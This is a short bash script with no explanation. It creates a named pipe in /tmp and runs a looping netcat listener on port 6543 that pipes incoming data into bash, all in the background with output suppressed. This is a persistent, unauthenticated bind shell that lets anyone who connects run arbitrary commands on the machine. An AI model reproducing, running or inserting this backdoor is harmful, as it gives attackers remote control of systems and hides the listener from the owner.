#!/usr/bin/env bash

cd /tmp
mkfifo FIFO > /dev/null 2>&1

listen() {
  while [ 1 ]; do
    nc -l -p 6543 < FIFO 2>/dev/null | bash > FIFO;
  done;
}

listen & > /dev/null 2>&1
